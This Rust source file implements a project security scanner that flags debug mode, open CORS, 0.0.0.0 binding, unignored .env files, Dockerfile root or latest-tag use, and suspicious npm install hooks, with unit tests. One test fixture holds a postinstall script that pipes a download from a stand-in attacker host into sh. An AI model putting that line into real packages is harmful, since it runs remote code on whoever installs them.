//! Detection of insecure configurations in project files.

use std::path::Path;

use super::findings::{FindingCategory, SecurityFinding, Severity};

/// Scan for insecure configurations in common config files.
pub fn scan_insecure_configs(project_path: &Path) -> Vec<SecurityFinding> {
    let mut findings = Vec::new();

    scan_debug_mode(project_path, &mut findings);
    scan_cors_config(project_path, &mut findings);
    scan_exposed_ports(project_path, &mut findings);
    scan_missing_env_example(project_path, &mut findings);
    scan_dockerfile_issues(project_path, &mut findings);
    scan_package_json_scripts(project_path, &mut findings);

    // Scan subdirectories
    if let Ok(entries) = std::fs::read_dir(project_path) {
        for entry in entries.filter_map(|e| e.ok()) {
            let sub = entry.path();
            if !sub.is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with('.')
                || name == "node_modules"
                || name == "target"
                || name == "__pycache__"
            {
                continue;
            }
            scan_debug_mode(&sub, &mut findings);
            scan_cors_config(&sub, &mut findings);
            scan_dockerfile_issues(&sub, &mut findings);
            scan_package_json_scripts(&sub, &mut findings);
        }
    }

    findings
}

fn read_file_if_exists(path: &Path) -> Option<String> {
    if path.exists() && path.is_file() {
        let meta = std::fs::metadata(path).ok()?;
        if meta.len() > 1_048_576 {
            return None; // skip large files
        }
        std::fs::read_to_string(path).ok()
    } else {
        None
    }
}

fn scan_debug_mode(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // Django settings.py: DEBUG = True
    for name in &["settings.py", "settings/base.py", "settings/production.py"] {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                if trimmed.starts_with("DEBUG")
                    && trimmed.contains("True")
                    && !trimmed.starts_with('#')
                {
                    findings.push(SecurityFinding::new(
                        format!("debug-django-{}", findings.len()),
                        Severity::High,
                        FindingCategory::DebugEnabled,
                        "Django DEBUG = True".into(),
                        format!("DEBUG está habilitado en {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Usar DEBUG = os.environ.get('DEBUG', 'False') == 'True'".into(),
                    ));
                }
            }
        }
    }

    // Flask app.run(debug=True)
    for name in &["app.py", "main.py", "run.py", "server.py", "wsgi.py"] {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                if line.contains("debug=True") || line.contains("debug = True") {
                    findings.push(SecurityFinding::new(
                        format!("debug-flask-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::DebugEnabled,
                        "Flask debug=True".into(),
                        format!("Debug habilitado en {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Usar variable de entorno para controlar debug mode".into(),
                    ));
                }
            }
        }
    }

    // Node/Express: NODE_ENV not set to production check
    let pkg_path = dir.join("package.json");
    if let Some(content) = read_file_if_exists(&pkg_path)
        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
        && let Some(scripts) = json.get("scripts").and_then(|s| s.as_object())
        && let Some(start) = scripts.get("start").and_then(|s| s.as_str())
        && !start.contains("NODE_ENV=production")
        && !start.contains("cross-env NODE_ENV")
        && start.contains("node ")
    {
        // Only warn if it's a server (not a build script)
        if start.contains("server") || start.contains("app") || start.contains("index") {
            findings.push(SecurityFinding::new(
                format!("node-env-{}", findings.len()),
                Severity::Low,
                FindingCategory::DebugEnabled,
                "NODE_ENV no definido en start script".into(),
                "El script 'start' no establece NODE_ENV=production".into(),
                Some(format!("{}/package.json", dir_label)),
                None,
                "Agregar NODE_ENV=production al start script o usar cross-env".into(),
            ));
        }
    }
}

fn scan_cors_config(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // Python: CORS_ALLOW_ALL_ORIGINS, allow_origins=["*"]
    let python_files = ["settings.py", "main.py", "app.py", "config.py"];
    for name in &python_files {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                if (trimmed.contains("CORS_ALLOW_ALL_ORIGINS") && trimmed.contains("True"))
                    || (trimmed.contains("allow_origins") && trimmed.contains("\"*\""))
                    || (trimmed.contains("origins")
                        && trimmed.contains("\"*\"")
                        && trimmed.contains("cors"))
                {
                    findings.push(SecurityFinding::new(
                        format!("cors-open-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::InsecureConfig,
                        "CORS permite todos los orígenes".into(),
                        format!("CORS wildcard (*) detectado en {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Restringir CORS a dominios específicos en producción".into(),
                    ));
                }
            }
        }
    }

    // JS/TS: cors({ origin: '*' }) or cors() without config
    let js_files = [
        "server.js",
        "server.ts",
        "app.js",
        "app.ts",
        "index.js",
        "index.ts",
    ];
    for name in &js_files {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                if (line.contains("cors()") && !line.contains("//"))
                    || (line.contains("cors(") && line.contains("'*'"))
                    || (line.contains("Access-Control-Allow-Origin") && line.contains("*"))
                {
                    findings.push(SecurityFinding::new(
                        format!("cors-js-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::InsecureConfig,
                        "CORS permisivo".into(),
                        format!("CORS abierto detectado en {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Configurar cors({ origin: ['https://tudominio.com'] })".into(),
                    ));
                }
            }
        }
    }
}

fn scan_exposed_ports(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // Check for 0.0.0.0 binding without awareness
    let files_to_check = [
        "main.py",
        "app.py",
        "server.py",
        "manage.py",
        "server.js",
        "server.ts",
        "app.js",
        "app.ts",
        "main.go",
        "main.rs",
    ];

    for name in &files_to_check {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                if line.contains("0.0.0.0")
                    && !line.trim().starts_with("//")
                    && !line.trim().starts_with('#')
                {
                    // Binding to all interfaces — warning only
                    findings.push(SecurityFinding::new(
                        format!("bind-all-{}", findings.len()),
                        Severity::Low,
                        FindingCategory::InsecureConfig,
                        "Binding a 0.0.0.0".into(),
                        format!("El servidor se enlaza a todas las interfaces en {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "En producción, usar 127.0.0.1 o configurar firewall".into(),
                    ));
                }
            }
        }
    }
}

fn scan_missing_env_example(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // .env exists but no .env.example
    if dir.join(".env").exists()
        && !dir.join(".env.example").exists()
        && !dir.join(".env.sample").exists()
    {
        findings.push(SecurityFinding::new(
            format!("env-no-example-{}", findings.len()),
            Severity::Low,
            FindingCategory::InsecureConfig,
            "Falta .env.example".into(),
            "Existe .env pero no hay .env.example para documentar las variables necesarias".into(),
            Some(format!("{}/.env", dir_label)),
            None,
            "Crear .env.example con nombres de variables (sin valores reales)".into(),
        ));
    }

    // Check if .env is in .gitignore
    let gitignore = dir.join(".gitignore");
    if dir.join(".env").exists() {
        if let Some(content) = read_file_if_exists(&gitignore) {
            let has_env_ignore = content.lines().any(|l| {
                let t = l.trim();
                t == ".env" || t == ".env*" || t == "*.env" || t == ".env.*"
            });
            if !has_env_ignore {
                findings.push(SecurityFinding::new(
                    format!("env-not-gitignored-{}", findings.len()),
                    Severity::High,
                    FindingCategory::InsecureConfig,
                    ".env no está en .gitignore".into(),
                    "El archivo .env podría ser commiteado al repositorio con secretos".into(),
                    Some(format!("{}/.gitignore", dir_label)),
                    None,
                    "Agregar .env a .gitignore inmediatamente".into(),
                ));
            }
        } else if !gitignore.exists() {
            findings.push(SecurityFinding::new(
                format!("no-gitignore-{}", findings.len()),
                Severity::High,
                FindingCategory::InsecureConfig,
                "No existe .gitignore".into(),
                "Sin .gitignore, archivos sensibles (.env, keys) podrían ser commiteados".into(),
                Some(dir_label.clone()),
                None,
                "Crear .gitignore con .env, *.pem, *.key, etc.".into(),
            ));
        }
    }
}

fn scan_dockerfile_issues(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    let dockerfile = dir.join("Dockerfile");
    if let Some(content) = read_file_if_exists(&dockerfile) {
        for (i, line) in content.lines().enumerate() {
            let trimmed = line.trim().to_uppercase();

            // Running as root
            if trimmed.starts_with("USER ROOT") {
                findings.push(SecurityFinding::new(
                    format!("docker-root-{}", findings.len()),
                    Severity::Medium,
                    FindingCategory::InsecureConfig,
                    "Container ejecuta como root".into(),
                    "El Dockerfile usa USER root".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Crear usuario non-root: RUN adduser --disabled-password appuser && USER appuser".into(),
                ));
            }

            // Using latest tag
            if trimmed.starts_with("FROM ") && trimmed.contains(":LATEST") {
                findings.push(SecurityFinding::new(
                    format!("docker-latest-{}", findings.len()),
                    Severity::Low,
                    FindingCategory::InsecureConfig,
                    "Imagen Docker usa tag :latest".into(),
                    "Usar :latest puede resultar en builds no reproducibles".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Fijar versión específica (ej: python:3.11-slim, node:20-alpine)".into(),
                ));
            }

            // COPY . . without .dockerignore
            if (trimmed.starts_with("COPY . .") || trimmed.starts_with("ADD . ."))
                && !dir.join(".dockerignore").exists()
            {
                findings.push(SecurityFinding::new(
                    format!("docker-copy-all-{}", findings.len()),
                    Severity::Medium,
                    FindingCategory::InsecureConfig,
                    "COPY . . sin .dockerignore".into(),
                    "Copiar todo el contexto puede incluir .env, .git, node_modules".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Crear .dockerignore con .env, .git, node_modules, target".into(),
                ));
            }
        }

        // Check if Dockerfile has no USER instruction (runs as root by default)
        let has_user = content
            .lines()
            .any(|l| l.trim().to_uppercase().starts_with("USER "));
        if !has_user {
            findings.push(SecurityFinding::new(
                format!("docker-no-user-{}", findings.len()),
                Severity::Medium,
                FindingCategory::InsecureConfig,
                "Dockerfile sin instrucción USER".into(),
                "Sin USER, el container ejecuta como root por defecto".into(),
                Some(format!("{}/Dockerfile", dir_label)),
                None,
                "Agregar USER non-root al final del Dockerfile".into(),
            ));
        }
    }
}

fn scan_package_json_scripts(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();
    let pkg = dir.join("package.json");

    if let Some(content) = read_file_if_exists(&pkg)
        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
    {
        // Check for pre/post install scripts (supply chain risk)
        if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
            for key in ["preinstall", "postinstall"] {
                if let Some(cmd) = scripts.get(key).and_then(|s| s.as_str())
                    && (cmd.contains("curl") || cmd.contains("wget") || cmd.contains("http"))
                {
                    findings.push(SecurityFinding::new(
                        format!("npm-{}-{}", key, findings.len()),
                        Severity::High,
                        FindingCategory::InsecureConfig,
                        format!("Script {} sospechoso", key),
                        format!("El script {} descarga desde internet: {}", key, cmd),
                        Some(format!("{}/package.json", dir_label)),
                        None,
                        "Revisar el script y asegurar que las fuentes son confiables".into(),
                    ));
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn setup_project(files: &[(&str, &str)]) -> TempDir {
        let dir = TempDir::new().unwrap();
        for (name, content) in files {
            let path = dir.path().join(name);
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(&path, content).unwrap();
        }
        dir
    }

    // --- Debug mode tests ---

    #[test]
    fn test_django_debug_true() {
        let dir = setup_project(&[("settings.py", "DEBUG = True\nALLOWED_HOSTS = ['*']")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_django_debug_false_no_finding() {
        let dir = setup_project(&[("settings.py", "DEBUG = False")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_flask_debug_true() {
        let dir = setup_project(&[("app.py", "app.run(host='0.0.0.0', debug=True)")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Flask debug")));
    }

    #[test]
    fn test_node_env_missing_in_start_script() {
        let dir = setup_project(&[("package.json", r#"{"scripts":{"start":"node server.js"}}"#)]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    #[test]
    fn test_node_env_present_no_finding() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"start":"NODE_ENV=production node server.js"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    // --- CORS tests ---

    #[test]
    fn test_cors_wildcard_python() {
        let dir = setup_project(&[("settings.py", "CORS_ALLOW_ALL_ORIGINS = True")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_wildcard_js() {
        let dir = setup_project(&[("server.js", "app.use(cors())")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    // --- Exposed ports ---

    #[test]
    fn test_binding_all_interfaces() {
        let dir = setup_project(&[("main.py", "app.run(host='0.0.0.0', port=8000)")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("0.0.0.0")));
    }

    // --- .env tests ---

    #[test]
    fn test_env_without_example() {
        let dir = setup_project(&[(".env", "SECRET=value")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains(".env.example") || f.title.contains(".gitignore"))
        );
    }

    #[test]
    fn test_env_with_example_no_finding() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.example", "SECRET="),
            (".gitignore", ".env"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains(".env.example")));
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("no está en .gitignore"))
        );
    }

    #[test]
    fn test_env_not_in_gitignore() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.example", "SECRET="),
            (".gitignore", "node_modules\ntarget"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains(".gitignore")));
    }

    // --- Dockerfile tests ---

    #[test]
    fn test_dockerfile_user_root() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM python:3.11\nUSER root\nCOPY . .\nCMD [\"python\", \"app.py\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("root")));
    }

    #[test]
    fn test_dockerfile_latest_tag() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM python:latest\nUSER appuser\nCMD [\"python\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains(":latest")));
    }

    #[test]
    fn test_dockerfile_copy_all_no_dockerignore() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM node:20\nCOPY . .\nUSER node\nCMD [\"node\", \"app.js\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("COPY . .")));
    }

    #[test]
    fn test_dockerfile_no_user_instruction() {
        let dir = setup_project(&[
            (
                "Dockerfile",
                "FROM python:3.11\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nCMD [\"python\", \"app.py\"]",
            ),
            (".dockerignore", ".env\n.git"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("sin instrucción USER"))
        );
    }

    #[test]
    fn test_dockerfile_with_user_no_finding() {
        let dir = setup_project(&[
            (
                "Dockerfile",
                "FROM python:3.11\nRUN adduser appuser\nCOPY requirements.txt .\nUSER appuser\nCMD [\"python\"]",
            ),
            (".dockerignore", ".env"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("sin instrucción USER"))
        );
    }

    // --- package.json supply chain ---

    #[test]
    fn test_suspicious_postinstall_script() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.com/script.sh | sh"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("postinstall")));
    }

    #[test]
    fn test_safe_postinstall_no_finding() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"postinstall":"node scripts/setup.js"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("postinstall")));
    }

    // --- Subdirectory scanning ---

    #[test]
    fn test_scans_subdirectories() {
        let dir = setup_project(&[("backend/settings.py", "DEBUG = True")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_empty_project() {
        let dir = TempDir::new().unwrap();
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.is_empty());
    }
}
